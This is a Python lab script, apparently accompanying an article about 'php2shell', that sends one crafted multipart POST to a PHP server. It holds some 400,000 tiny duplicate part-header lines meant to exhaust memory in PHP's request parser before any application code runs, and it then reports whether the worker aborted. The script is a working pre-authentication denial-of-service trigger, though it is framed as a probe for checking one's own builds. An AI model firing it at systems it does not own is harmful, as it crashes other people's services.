#!/usr/bin/env python3
"""php2shell lab — trigger probe (no exploit, no code execution).

Demonstrates the two properties the article claims, against a target you own:

  1. A multipart POST is parsed BEFORE application code runs, so a request can
     be aborted by PHP itself without the script ever executing.
  2. The parser's in-memory representation of a header block is far larger than
     its wire representation, so a body well under post_max_size can still
     exhaust memory_limit.

It sends one request and reports what happened. It does not corrupt state,
does not touch sessions, and does not execute anything on the target.

Usage:
    python3 probe.py --target http://127.0.0.1:8080/ --header-lines 400000
"""

from __future__ import annotations

import argparse
import http.client
import sys
import time
import urllib.parse

BOUNDARY = b"----php2shelllab"

# One part whose header block is a long run of 3-byte duplicate header lines.
# PHP stores each header line in a growable list of (name, value) pairs, so the
# in-memory cost is roughly 300x the wire cost per line.
HEADER_LINE = b"x:\n"


def build_body(header_lines: int) -> bytes:
    head = (
        b"--" + BOUNDARY + b"\r\n"
        b'Content-Disposition: form-data; name="big"\r\n'
    )
    tail = b"\r\nZ\r\n--" + BOUNDARY + b"--\r\n"
    return head + HEADER_LINE * header_lines + tail


def main() -> int:
    ap = argparse.ArgumentParser(description="php2shell trigger probe")
    ap.add_argument("--target", default="http://127.0.0.1:8080/")
    ap.add_argument("--header-lines", type=int, default=400_000,
                    help="3-byte header lines in the part (default 400000 -> ~1.2 MB wire)")
    ap.add_argument("--timeout", type=float, default=120.0)
    args = ap.parse_args()

    url = urllib.parse.urlsplit(args.target)
    if url.scheme != "http" or not url.hostname:
        print("only plain http:// targets are supported", file=sys.stderr)
        return 2

    body = build_body(args.header_lines)
    path = url.path or "/"
    if url.query:
        path += "?" + url.query

    print(f"target        {args.target}")
    print(f"wire body     {len(body):,} bytes")
    print(f"header lines  {args.header_lines:,}")

    conn = http.client.HTTPConnection(url.hostname, url.port or 80,
                                      timeout=args.timeout)
    started = time.monotonic()
    try:
        conn.request(
            "POST", path, body=body,
            headers={
                "Content-Type": "multipart/form-data; boundary=" + BOUNDARY.decode(),
                "Content-Length": str(len(body)),
                "User-Agent": "php2shell-lab-probe/1.0",
            },
        )
        resp = conn.getresponse()
        payload = resp.read()
        elapsed = time.monotonic() - started
        status = resp.status
    except Exception as exc:  # noqa: BLE001 - the lab wants the raw failure
        elapsed = time.monotonic() - started
        print(f"\nno response after {elapsed:.2f}s: {type(exc).__name__}: {exc}")
        print("a dead connection here usually means the worker aborted mid-request")
        return 0
    finally:
        conn.close()

    print(f"status        HTTP {status}")
    print(f"elapsed       {elapsed:.2f}s")
    print(f"body bytes    {len(payload)}")

    # The decisive signal is whether the script ran. With display_errors=On the
    # fatal error is rendered into the response, so the status code can still be
    # 200 even though PHP aborted during startup. Grep the body, not the code.
    app_ran = b"the script executed" in payload
    oom = b"Allowed memory size" in payload and b"exhausted" in payload
    exhausted = b"Input variables exceeded" in payload

    if app_ran:
        print("\nRESULT: the request completed and the script executed.")
        print("        The parser finished inside the limits you gave it. Either")
        print("        this build is patched, or the body was too small to matter.")
        return 0

    if oom:
        print("\nRESULT: PHP aborted inside the request parser.")
        print("        The response contains only the fatal error; the target")
        print("        script never executed. That is the pre-auth property.")
        return 0

    if exhausted:
        print("\nRESULT: stopped by max_input_vars before reaching memory_limit.")
        print("        Raise max_input_vars or reduce --header-lines.")
        return 0

    print("\nRESULT: unexpected response; inspect it above.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
